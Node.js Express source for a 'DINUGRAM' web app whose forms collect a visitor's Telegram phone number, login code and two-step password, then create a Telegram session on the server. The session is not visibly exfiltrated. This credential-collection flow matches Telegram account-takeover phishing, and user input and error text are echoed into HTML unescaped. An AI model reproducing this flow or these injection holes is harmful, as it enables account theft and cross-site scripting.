const express = require("express");
const { TelegramClient, Api } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { computeCheck } = require("telegram/Password");
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const PORT = process.env.PORT || 3000;
const apiId = Number(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;

const clients = new Map();

app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>DINUGRAM Login</title>
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1"
        />
      </head>
      <body>
        <h2>DINUGRAM</h2>

        <p>Enter your Telegram phone number</p>

        <form action="/send-code" method="POST">
          <input
            type="tel"
            name="phoneNumber"
            placeholder="+251..."
            required
          />

          <button type="submit">Send Code</button>
        </form>
      </body>
    </html>
  `);
});

app.get("/telegram-status", (req, res) => {
  res.json({
    connected: !!(apiId && apiHash),
    message:
      apiId && apiHash
        ? "Telegram API credentials loaded successfully"
        : "Telegram API credentials are missing"
  });
});

app.post("/send-code", async (req, res) => {
  try {
    const phoneNumber = req.body.phoneNumber;

    if (!phoneNumber) {
      return res.status(400).send("Phone number is required");
    }

    if (!apiId || !apiHash) {
      return res
        .status(500)
        .send("Telegram API credentials are missing");
    }

    const client = new TelegramClient(
      new StringSession(""),
      apiId,
      apiHash,
      {
        connectionRetries: 5
      }
    );

    await client.connect();

    const result = await client.invoke(
      new Api.auth.SendCode({
        phoneNumber: phoneNumber,
        apiId: apiId,
        apiHash: apiHash,
        settings: new Api.CodeSettings({})
      })
    );

    clients.set(phoneNumber, {
      client: client,
      phoneCodeHash: result.phoneCodeHash
    });

    res.send(`
      <!DOCTYPE html>
      <html>
        <head>
          <title>DINUGRAM Verification</title>
          <meta
            name="viewport"
            content="width=device-width, initial-scale=1"
          />
        </head>

        <body>
          <h2>DINUGRAM</h2>

          <p>Enter Telegram login code</p>

          <form action="/verify-code" method="POST">
            <input
              type="hidden"
              name="phoneNumber"
              value="${phoneNumber}"
            />

            <input
              type="text"
              name="phoneCode"
              placeholder="Login code"
              autocomplete="one-time-code"
              required
            />

            <button type="submit">
              Verify Code
            </button>
          </form>
        </body>
      </html>
    `);

  } catch (error) {
    console.error("Send code error:", error);

    res.status(500).send(
      "Error: " +
        (error.message || "Could not send verification code")
    );
  }
});

app.post("/verify-code", async (req, res) => {
  const phoneNumber = req.body.phoneNumber;
  const phoneCode = req.body.phoneCode;

  try {
    const loginData = clients.get(phoneNumber);

    if (!loginData) {
      return res.status(400).send(`
        <h2>DINUGRAM</h2>
        <p>Login session expired.</p>
        <a href="/">Try Again</a>
      `);
    }

    const { client, phoneCodeHash } = loginData;

    await client.invoke(
      new Api.auth.SignIn({
        phoneNumber: phoneNumber,
        phoneCodeHash: phoneCodeHash,
        phoneCode: phoneCode
      })
    );

    const session = client.session.save();

    console.log("Telegram login successful");
    console.log("Session created successfully");

    clients.delete(phoneNumber);

    res.send(`
      <h2>DINUGRAM</h2>
      <h3>Login successful ✅</h3>
      <p>Your Telegram account is connected.</p>
    `);

  } catch (error) {
    console.error("Verify code error:", error);

    if (
      error.message &&
      error.message.includes("SESSION_PASSWORD_NEEDED")
    ) {
      return res.send(`
        <!DOCTYPE html>
        <html>
          <head>
            <title>DINUGRAM Two-Step Verification</title>
            <meta
              name="viewport"
              content="width=device-width, initial-scale=1"
            />
          </head>

          <body>
            <h2>DINUGRAM</h2>

            <p>Two-Step Verification password is required.</p>

            <form action="/verify-password" method="POST">
              <input
                type="hidden"
                name="phoneNumber"
                value="${phoneNumber}"
              />

              <input
                type="password"
                name="password"
                placeholder="Telegram password"
                required
              />

              <button type="submit">
                Verify Password
              </button>
            </form>
          </body>
        </html>
      `);
    }

    res.status(500).send(`
      <h2>DINUGRAM</h2>
      <p>Verification failed.</p>
      <p>${error.message || "Invalid code"}</p>
      <a href="/">Try Again</a>
    `);
  }
});

app.post("/verify-password", async (req, res) => {
  try {
    const phoneNumber = req.body.phoneNumber;
    const password = req.body.password;

    if (!phoneNumber || !password) {
      return res
        .status(400)
        .send("Phone number and password are required");
    }

    const loginData = clients.get(phoneNumber);

    if (!loginData) {
      return res.status(400).send(`
        <h2>DINUGRAM</h2>
        <p>Login session expired.</p>
        <a href="/">Try Again</a>
      `);
    }

    const { client } = loginData;

    const passwordInfo = await client.invoke(
      new Api.account.GetPassword({})
    );

    const passwordCheck = await computeCheck(
      passwordInfo,
      password
    );

    await client.invoke(
      new Api.auth.CheckPassword({
        password: passwordCheck
      })
    );

    const session = client.session.save();


    console.log("Two-Step Verification successful");
    console.log("Telegram session created successfully");

    clients.delete(phoneNumber);

    res.send(`
      <!DOCTYPE html>
      <html>
        <head>
          <title>DINUGRAM</title>
          <meta
            name="viewport"
            content="width=device-width, initial-scale=1"
          />
        </head>

        <body>
          <h2>DINUGRAM</h2>

          <h3>Login successful ✅</h3>

          <p>
            Your Telegram account connected successfully.
          </p>
        </body>
      </html>
    `);

  } catch (error) {
    console.error("Password verification error:", error);

    res.status(500).send(`
      <h2>DINUGRAM</h2>
      <p>Password verification failed.</p>
      <p>${error.message || "Wrong password"}</p>
      <a href="/">Try Again</a>
    `);
  }
});


app.get("/session", (req, res) => {
  res.send("DINUGRAM Telegram session is ready");
});


app.get("/status", (req, res) => {
  res.json({
    app: "DINUGRAM",
    telegram: "connected",
    status: "ready"
  });
});
app.get("/me", async (req, res) => {
  res.send(`
    <h2>DINUGRAM</h2>
    <p>Telegram login successful ✅</p>
  `);
});
app.listen(PORT, "0.0.0.0", () => {
  console.log(`DINUGRAM running on port ${PORT}`);
});
